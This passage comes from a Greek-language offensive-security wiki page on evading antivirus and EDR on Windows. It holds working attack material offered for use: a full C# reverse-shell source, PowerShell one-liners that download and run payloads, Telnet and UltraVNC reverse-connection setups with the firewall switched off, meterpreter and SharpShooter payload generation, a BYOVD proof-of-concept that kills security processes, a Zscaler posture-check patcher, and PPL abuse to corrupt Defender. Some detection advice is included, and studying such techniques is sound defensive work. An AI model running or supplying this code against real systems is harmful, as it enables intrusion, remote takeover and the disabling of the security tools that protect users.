- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ίσως έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια εκτελέσιμα αρχεία από το internet και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που στοχεύει να προστατεύσει τον τελικό χρήστη από το να τρέξει ενδεχομένως κακόβουλες εφαρμογές.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη φήμη, που σημαίνει ότι εφαρμογές που δεν κατεβάζονται συχνά θα ενεργοποιούν το SmartScreen, ειδοποιώντας και αποτρέποντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί παρόλα αυτά να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα NTFS Alternate Data Stream με το όνομα Zone.Identifier που δημιουργείται αυτόματα κατά το κατέβασμα αρχείων από το internet, μαζί με το URL από το οποίο λήφθηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι executables που είναι signed με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **καταγράφουν γεγονότα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Παρόμοια με το πώς το AMSI απενεργοποιείται (παρακαμπτόμενο), είναι επίσης δυνατό να κάνετε τη συνάρτηση χρήστη χώρου `EtwEventWrite` να επιστρέφει αμέσως χωρίς να καταγράφει οποιαδήποτε γεγονότα. Αυτό επιτυγχάνεται με το να γίνει patch της συνάρτησης στη μνήμη ώστε να επιστρέφει άμεσα, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για εκείνη τη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες σε **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και καιρό και παραμένει ένας εξαιρετικός τρόπος για την εκτέλεση των post-exploitation εργαλείων σας χωρίς να εντοπιστείτε από AV.

Εφόσον το payload φορτώνεται απευθείας στη μνήμη χωρίς να αγγίξει το δίσκο, θα χρειαστεί να ανησυχήσουμε μόνο για το patching του AMSI για όλη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) ήδη παρέχουν τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει το **spawn ενός νέου θυσιαστικού process**, την έγχυση του post-exploitation κακόβουλου κώδικα σε εκείνη τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και, όταν τελειώσει, το τερματισμό της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση συμβαίνει **έξω από** τη διεργασία του Beacon implant. Αυτό σημαίνει ότι αν κάτι στην post-exploitation ενέργειά μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant μας να επιβιώσει.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την έγχυση του post-exploitation κακόβουλου κώδικα **μέσα στη δική του διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας που θα σαρωθεί από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στον συμβιβασμένο υπολογιστή πρόσβαση **στο interpreter environment εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του συμβιβασμένου μηχανήματος.

Το repo αναφέρει: Το Defender εξακολουθεί να σαρώσει τα scripts αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε static signatures**. Οι δοκιμές με τυχαία μη-ομπφουσκωμένα reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## TokenStomping

Token stomping είναι μια τεχνική που επιτρέπει σε έναν επιτιθέμενο να **χειραγωγήσει το access token ή ένα προϊόν ασφαλείας όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα δικαιώματά του ώστε η διεργασία να μην τερματιστεί αλλά να μην έχει τις άδειες για να ελέγξει για κακόβουλες δραστηριότητες.

Για να το αποτρέψει αυτό, τα Windows θα μπορούσαν να **αποτρέπουν εξωτερικές διεργασίες** από το να λαμβάνουν handles πάνω στα tokens των διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να αναπτύξετε το Chrome Remote Desktop στον υπολογιστή του θύματος και στη συνέχεια να το χρησιμοποιήσετε για να τον αναλάβετε και να διατηρήσετε persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει να ορίσετε το pin χωρίς να χρησιμοποιήσετε το GUI).


## Advanced Evasion

Η παράκαμψη (evasion) είναι ένα πολύ σύνθετο θέμα· μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε πλήρως αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο θα επιτεθείτε θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτείνω θερμά να δείτε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια εισαγωγή σε πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτό είναι επίσης μια εξαιρετική ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) που θα **αφαιρεί μέρη του binary** μέχρι να **ανακαλύψει ποιο κομμάτι το Defender** βρίσκει ως κακόβουλο και να σας το χωρίσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο πράγμα είναι** το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows ερχόντουσαν με έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ρύθμισέ το να **ξεκινάει** όταν εκκινεί το σύστημα και **τρέξε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλάξτε telnet port** (stealth) και απενεργοποιήστε το firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλεις τα bin downloads, όχι το setup)

**ON THE HOST**: Εκτέλεσε _**winvnc.exe**_ και ρύθμισε τον server:

- Ενεργοποίησε την επιλογή _Disable TrayIcon_
- Όρισε κωδικό στο _VNC Password_
- Όρισε κωδικό στο _View-Only Password_

Στη συνέχεια, μετακίνησε το binary _**winvnc.exe**_ και το **πρόσφατα** δημιουργημένο αρχείο _**UltraVNC.ini**_ μέσα στον **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα** στο **host** του το binary `vncviewer.exe -listen 5900` ώστε να είναι **έτοιμος** να πιάσει μια reverse **VNC connection**. Έπειτα, μέσα στον **victim**: Εκκίνησε το winvnc daemon `winvnc.exe -run` και τρέξε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Για να διατηρήσεις stealth πρέπει να αποφύγεις τα εξής

- Μην ξεκινάς `winvnc` αν τρέχει ήδη ή θα προκαλέσεις ένα [popup](https://i.imgur.com/1SROTTl.png). Έλεγξε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινάς `winvnc` χωρίς `UltraVNC.ini` στον ίδιο φάκελο ή θα ανοίξει [the config window](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξεις `winvnc -h` για βοήθεια ή θα προκαλέσεις ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρήση μεταγλωττιστή
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση του python για παράδειγμα build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Η Storm-2603 αξιοποίησε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις endpoint προστασίες πριν εγκαταστήσει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για να εκτελέσει προνομιακές λειτουργίες στον kernel που ακόμη και υπηρεσίες Protected-Process-Light (PPL) AV δεν μπορούν να μπλοκάρουν.

Κύρια συμπεράσματα
1. **Signed driver**: Το αρχείο που αφήνεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη Microsoft signature φορτώνει ακόμα και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργό.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή εγγράφει τον driver ως **kernel service** και η δεύτερη τον εκκινεί ώστε το `\\.\ServiceMouse` να γίνεται προσβάσιμο από τον user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Λειτουργία                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματίζει μια αυθαίρετη διεργασία με PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγράφει ένα αυθαίρετο αρχείο στο δίσκο |
| `0x990001D0` | Αποφορτώνει τον driver και αφαιρεί την υπηρεσία |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει εντελώς τις προστασίες σε user-mode; κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να παραποιήσει αντικείμενα του kernel ανεξάρτητα από PPL/PP, ELAM ή άλλα μέτρα ενίσχυσης.

Ανίχνευση / Αντιμετώπιση
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευπαθών drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.  
•  Παρακολουθείτε τη δημιουργία νέων *kernel* υπηρεσιών και ειδοποιήστε όταν ένας driver φορτώνεται από κατάλογο εγγράψιμο από όλους ή δεν υπάρχει στη λίστα επιτρεπόμενων.  
•  Ελέγχετε για user-mode handles προς custom device objects ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες device-posture και βασίζεται σε Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση του posture γίνεται εξ ολοκλήρου client-side (ένα boolean αποστέλλεται στον server).  
2. Τα εσωτερικά RPC endpoints επικυρώνουν μόνο ότι το συνδεόμενο εκτελέσιμο είναι signed by Zscaler (μέσω `WinVerifyTrust`).

Με το patching τεσσάρων signed binaries στο δίσκο, και οι δύο μηχανισμοί μπορούν να ουδετεροποιηθούν:

| Binary | Αρχική λογική που τροποποιείται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντα επιστρέφει `1` ώστε κάθε έλεγχος να θεωρείται συμβατός |
| `ZSAService.exe` | Έμμεση κλήση προς `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμα και unsigned) process μπορεί να bind-άρει στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας στον tunnel | Παρακαμφθεί |

Απόσπασμα ελάχιστου patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι posture έλεγχοι εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο όπως ορίζεται από τις πολιτικές Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς καθαρά client-side αποφάσεις εμπιστοσύνης και απλοί έλεγχοι υπογραφών μπορούν να παρακαμφθούν με λίγα byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) επιβάλλει μια signer/level ιεραρχία έτσι ώστε μόνο προστατευμένες διεργασίες με ίσο ή υψηλότερο επίπεδο να μπορούν να παραποιούν η μία την άλλη. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε ευγενική λειτουργικότητα (π.χ., logging) σε ένα περιορισμένο, PPL-backed write primitive εναντίον προστατευμένων καταλόγων που χρησιμοποιούνται από AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο συστημικό binary `C:\Windows\System32\ClipUp.exe` αυτο-εκκινεί και δέχεται μια παράμετρο για να γράψει ένα αρχείο log σε μια διαδρομή που καθορίζεται από τον καλούντα.
- Όταν εκκινείται ως PPL process, η εγγραφή αρχείου γίνεται με PPL backing.
- Το ClipUp δεν μπορεί να επεξεργαστεί paths που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- Λίστα short names: `dir /x` σε κάθε parent directory.
- Απόκτηση short path στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Δώστε το ClipUp log-path όρισμα για να αναγκάσετε τη δημιουργία αρχείου σε έναν προστατευμένο AV directory (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Εάν το target binary είναι κανονικά ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή στο boot πριν το AV ξεκινήσει, εγκαθιστώντας μια auto-start service που τρέχει αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με Process Monitor (boot logging).
4) Στο reboot η εγγραφή με PPL backing γίνεται πριν το AV κλειδώσει τα binaries του, διαφθείροντας το target αρχείο και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε το περιεχόμενο που γράφει το ClipUp πέρα από την τοποθέτηση· το primitive είναι κατάλληλο περισσότερο για αλλοίωση παρά για ακριβή έγχυση περιεχομένου.
- Απαιτεί local admin/SYSTEM για να εγκατασταθεί/εκκινήσει υπηρεσία και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει κλειδώματα αρχείων.

Detections
